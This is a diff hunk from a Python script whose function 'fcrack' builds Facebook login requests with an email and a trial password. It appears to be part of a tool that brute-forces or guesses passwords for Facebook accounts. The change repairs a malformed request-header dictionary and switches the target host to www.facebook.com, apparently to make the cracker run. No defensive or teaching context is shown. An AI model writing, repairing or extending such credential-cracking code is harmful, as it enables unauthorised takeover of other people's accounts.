@@ -531,9 +531,10 @@ def fcrack(uid,pwx,tl):
 			"unrecognized_tries":"0",
 			"email":uid,
 			"pass":ps,
-			"login":"Log In"}
-			'header_freefb = {'authority:'x.facebook.com',
-			'upgrade-insecure-requests': '1',
+                        "login":"Log In"}
+			header_freefb = {
+			'authority': 'www.facebook.com',			
+		        'upgrade-insecure-requests': '1',
 			'viewport-width': '980',
 			'method': 'path',
 			'scheme': 'https',			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
